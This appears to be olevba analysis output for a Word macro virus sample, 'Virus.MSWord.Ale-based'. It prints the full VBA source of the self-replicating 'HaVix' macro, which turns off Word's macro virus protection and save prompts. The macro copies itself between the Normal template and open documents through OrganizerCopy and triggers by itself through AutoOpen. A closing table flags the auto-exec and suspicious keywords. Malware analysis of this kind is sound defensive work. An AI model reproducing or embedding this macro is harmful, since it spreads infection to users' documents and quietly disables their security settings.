olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ale-based
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ale-based - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO HaVix.bas 
in file: Virus.MSWord.Ale-based - OLE stream: 'Macros/VBA/HaVix'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub HaVix()
Attribute HaVix.VB_Description = "Macro created 02/05/98 by Home"
Attribute HaVix.VB_ProcData.VB_Invoke_Func = "Project.HaVix.HaVix"
    
    
    
    
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
leprican = 0
Set leprison = MacroContainer
If leprison = NormalTemplate Then leprican = 1
If leprican = 1 Then leprishaft = NormalTemplate.FullName Else leprishaft = ActiveDocument.FullName
If leprican = 1 Then leprigome = ActiveDocument.FullName Else leprigome = NormalTemplate.FullName
Application.OrganizerCopy Source:=leprishaft, Destination:=leprigome, Name:="HaVix", Object:=wdOrganizerObjectProjectItems
If leprican = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If leprican = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
gone:
End Sub
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 02/05/98 by HaVix"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.HaVix.AutoOpen"
    On Error Resume Next
    Call HaVix
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+----------+--------------------+---------------------------------------------+

